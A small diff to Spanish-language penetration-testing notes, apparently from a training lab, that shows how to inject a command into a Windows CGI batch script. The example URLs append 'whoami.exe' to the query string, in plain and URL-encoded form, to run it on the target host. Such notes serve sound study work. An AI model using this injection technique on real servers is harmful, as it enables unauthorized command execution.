@@ -20,8 +20,10 @@
 si el comando es complicado, deberemos encodear en URL.
 ##### Ej:
 para whoami:
+
             http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 Encodeado:
+
             http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
             
 
